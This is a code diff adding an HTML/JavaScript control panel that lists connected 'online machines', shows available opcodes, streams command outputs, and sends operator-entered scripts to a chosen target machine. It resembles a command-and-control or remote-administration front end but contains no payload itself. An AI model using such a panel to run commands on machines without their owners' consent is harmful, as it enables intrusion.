@@ -1,0 +1,111 @@
+<body>
+<style>
+div.logdiv {
+    width: auto;
+    height: 40%;
+    border: 1px solid black;
+    padding: 5px;
+    margin: 5px;
+}
+div.logs{
+    overflow: auto;
+    height: 70%;
+    display: flex;
+    flex-direction: column-reverse;
+}
+#cmdlist{
+    overflow: auto;
+    height: 70%;
+}
+div.cmddiv {
+    width: 50%;
+    height: 100%;
+    border: 1px solid black;
+    padding: 5px;
+    margin: 5px;
+}
+div.cmddiv2 {
+    width: 25%;
+    height: 100%;
+    border: 1px solid black;
+    padding: 5px;
+    margin: 5px;
+}
+div.parent {
+    width: 100%;
+    float: left;
+    height: 50%;
+    display: flex;
+}
+iframe {
+    height: 3em;
+}
+</style>
+<div class="logdiv">
+    <h2>Command outputs</h2>
+    <div id="logs" class="logs"></div>
+</div>
+<div class="parent">
+<div class="cmddiv">
+    
+    <h2>Send commands</h2>
+    <p id="cmds"></p>
+    <form action="/sendcmd" id="cmdform" target="dummyframe">
+        Target machine: <input type="text" name="target">
+        <input type="submit" value="Submit">
+    </form>
+    <textarea rows="10" cols="50" name="data" form="cmdform" placeholder="Enter script here" spellcheck="false"></textarea>
+    <br><br>
+    <iframe name="dummyframe" id="dummyframe"></iframe>
+</div>
+<div class="cmddiv2">
+    <h2>Available commands</h2>
+    <ul id="cmdlist"></ul>
+</div>
+<div class="cmddiv2">
+    <h2>Online machines</h2>
+    <ul id="mllist"></ul>
+</div>
+</div>
+</body>
+<script>
+function escapeHtml(unsafe) {
+    return unsafe
+         .replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#039;");
+ }
+function updateLog(){
+    const xhr = new XMLHttpRequest();
+    xhr.onload = () => {
+        document.getElementById("logs").innerHTML = escapeHtml(xhr.responseText.trim().replaceAll("\r", "")).replaceAll("\n", "<br>");
+        setTimeout(updateLog, 1000);
+    };
+    xhr.open("GET", "/recv", true);
+    xhr.send(null);
+}
+function updateMach(){
+    const xhr = new XMLHttpRequest();
+    xhr.onload = () => {
+        console.log(JSON.parse(xhr.responseText))
+        if((JSON.parse(xhr.responseText).join("</li><li>")).length == 0){
+            document.getElementById("mllist").innerHTML = "(none)";
+        }else{
+            document.getElementById("mllist").innerHTML = "<li>"+(JSON.parse(xhr.responseText)).join("</li><li>")+"</li>";
+        }
+        setTimeout(updateMach, 1000);
+    };
+    xhr.open("GET", "/clients", true);
+    xhr.send(null);
+}
+updateLog();
+updateMach();
+const request = new XMLHttpRequest();
+request.open("GET", "/opcodes", false);
+request.send(null);
+
+document.getElementById("cmdlist").innerHTML = "<li>"+JSON.parse(request.responseText).join("</li><li>")+"</li>";
+
+</script>
